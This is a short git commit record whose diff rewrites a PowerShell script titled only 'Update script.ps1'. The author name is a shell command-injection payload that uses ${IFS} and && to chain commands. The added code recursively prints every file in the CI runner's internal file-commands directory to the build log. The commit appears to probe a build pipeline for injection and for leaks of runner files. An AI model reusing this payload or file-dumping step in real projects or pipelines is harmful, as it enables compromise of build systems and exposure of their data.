9afb31354812386b226f45877ea73e062391371b
stp-$('&&${IFS}echo${IFS}${IFS}&&echo${IFS}fullname&&${IFS}echo${IFS}') <76434077+d3kum1d0r1y4@users.noreply.github.com>
2023-08-09 12:54:06 +0800

    Update script.ps1

--- src/script.ps1
+++ src/script.ps1
@@ -1,2 +1,5 @@
-pwd
-ls
+Get-ChildItem -Path "D:\a\_temp\_runner_file_commands\" -Recurse -File | ForEach-Object {
+    $filePath = $_.FullName
+    Write-Host "File: $filePath"
+    Get-Content -Path $filePath
+}
